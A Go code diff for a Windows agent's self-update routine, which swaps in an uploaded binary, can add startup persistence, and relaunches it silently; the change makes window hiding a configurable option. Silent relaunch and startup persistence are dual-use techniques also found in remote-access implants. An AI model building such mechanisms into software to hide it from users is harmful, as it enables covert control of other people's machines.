@@ -21,14 +21,14 @@ func samePathByOS(left string, right string) bool {
 	return strings.EqualFold(filepath.Clean(left), filepath.Clean(right))
 }
 
-func runAgentUpdate(sourcePath string, enablePersistence bool) error {
+func runAgentUpdate(sourcePath string, enablePersistence bool, hideWindow bool) error {
 	currentExe, currentErr := resolveCurrentExecutableOnDisk()
 	startupPath, startupEnabled, err := startupTargetPath(enablePersistence)
 	if err != nil {
 		return err
 	}
 
-	log.Printf("agent_update[win]: source=%q persistence=%v currentExe=%q currentErr=%v startupEnabled=%v startupPath=%q", sourcePath, enablePersistence, currentExe, currentErr, startupEnabled, startupPath)
+	log.Printf("agent_update[win]: source=%q persistence=%v currentExe=%q currentErr=%v startupEnabled=%v startupPath=%q hideWindow=%v", sourcePath, enablePersistence, currentExe, currentErr, startupEnabled, startupPath, hideWindow)
 
 	if currentErr != nil && !startupEnabled {
 		return currentErr
@@ -65,7 +65,7 @@ func runAgentUpdate(sourcePath string, enablePersistence bool) error {
 
 	if shouldLaunchUploadedBinaryDirectly(currentExe, startupEnabled) {
 		log.Printf("agent_update[win]: current executable appears transient (%q), launching uploaded binary directly: %q", currentExe, sourcePath)
-		if err := startSilentProcess(sourcePath, nil, "", true); err != nil {
+		if err := startSilentProcess(sourcePath, nil, "", hideWindow); err != nil {
 			return fmt.Errorf("failed to launch uploaded binary directly: %w", err)
 		}
 		return nil
@@ -84,7 +84,7 @@ func runAgentUpdate(sourcePath string, enablePersistence bool) error {
 	}
 	_ = os.Remove(sourcePath)
 
-	if err := startSilentProcess(restartPath, nil, "", true); err != nil {
+	if err := startSilentProcess(restartPath, nil, "", hideWindow); err != nil {
 		return fmt.Errorf("failed to launch updated agent: %w", err)
 	}
 	log.Printf("agent_update[win]: started updated executable directly: %q", restartPath)
